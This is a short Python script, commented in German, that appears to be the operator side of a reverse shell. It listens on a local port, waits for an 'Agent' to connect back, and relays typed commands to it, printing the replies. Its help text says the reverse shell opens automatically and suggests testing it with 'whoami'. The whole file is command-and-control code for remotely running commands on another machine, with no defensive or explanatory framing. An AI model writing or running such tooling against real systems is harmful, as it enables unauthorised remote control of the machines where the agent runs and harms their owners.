import socket
import os
import threading

showData = False

def listening():
    while True:
        data = clientsock.recv(65500)
        if showData == True:
            print(data.decode())
        
def showHelp():
    print('''
          Installierte Commands:
          
          Die ReverseShell ist automatisch nach der Verbindung geöffnet. Jedes Kommando wird direkt vom Agent empfangen.
          Teste es mit 'whoami'. 
          
          [exit] - Schließen
          [help] - Hilfe öffnen
          
          ''')
    
    
    



    

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 4422)
    print(f"Starting up on {server_address}")
    sock.bind(server_address)
    sock.listen(1)

    clientsock, (ip,port) = sock.accept()
    print(f"[+] New Agent connect from {ip}:{port}")
    threading.Thread(target=listening).start()
    while True:
        
        #try:
        #    data = clientsock.recv(65500)
        #    if data:
        #        print("Hier: " + data.decode())
        #except ConnectionResetError:
        #    print(f"\nConnection with {ip}:{port} lost.")
        
        command = input("Command:")
        showData = True
        if command.lower() == "exit":
            sock.close()
            print("Verbindung wird geschlossen.")
            break
        if command.lower() == "help":
            showHelp()
            continue
            
        
        clientsock.send(command.encode())
        
        
    
    

